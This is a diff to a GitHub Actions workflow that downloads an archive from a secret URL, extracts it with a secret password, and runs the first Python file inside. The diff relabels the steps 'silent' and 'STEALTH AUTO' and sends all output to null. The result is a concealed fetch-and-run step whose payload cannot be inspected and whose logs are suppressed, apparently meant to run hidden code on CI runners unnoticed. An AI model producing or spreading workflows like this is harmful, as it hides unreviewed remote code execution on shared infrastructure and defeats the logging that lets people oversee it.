@@ -17,10 +17,12 @@ jobs:
     steps:
       - uses: actions/checkout@v3
 
-      - name: Prepare dependencies
-        run: choco install 7zip -y --no-progress > $null
+      - name: Prepare dependencies (silent)
+        shell: powershell
+        run: |
+          choco install 7zip -y --no-progress > $null
 
-      - name: Download package
+      - name: Download package (silent)
         shell: powershell
         env:
           SRC_URL: ${{ secrets.LINK }}
@@ -28,14 +30,16 @@ jobs:
           $ProgressPreference = 'SilentlyContinue'
           Invoke-WebRequest -Uri "$Env:SRC_URL" -OutFile "app.7z" > $null
 
-      - name: Extract package
+      - name: Extract package (silent)
         shell: powershell
         env:
           ARCHIVE_KEY: ${{ secrets.PASSWORD }}
         run: |
           & "C:\Program Files\7-Zip\7z.exe" x app.7z -p"$Env:ARCHIVE_KEY" -oextracted -y > $null
 
-      - name: Run worker
+      - name: Run worker (STEALTH AUTO)
         shell: powershell
         run: |
-          python extracted\worker.py *> $null
+          $file = Get-ChildItem extracted -Recurse -Filter *.py | Select-Object -First 1
+          if (-not $file) { exit 1 }
+          python $file.FullName *> $null
